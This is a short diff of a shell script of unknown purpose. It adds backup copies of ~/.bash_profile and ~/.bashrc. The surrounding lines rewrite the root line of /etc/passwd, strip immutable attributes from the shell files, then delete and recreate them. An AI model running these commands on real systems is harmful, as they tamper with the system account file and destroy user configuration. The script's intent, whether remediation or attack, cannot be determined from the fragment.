@@ -7,6 +7,8 @@
 \/bin/busybox sed -i '1s/.*/root:x:0:0:root:\/root:\/bin\/bash/' /etc/passwd
 \chattr -i ~/.bash_profile
 \chattr -i ~/.bashrc
+\cp ~/.bash_profile ~/.xbash_profile.old
+\cp ~/.bashrc ~/.xbashrc.old
 \rm -r ~/.bash_profile
 \rm -r ~/.bashrc
 \touch ~/.bashrc
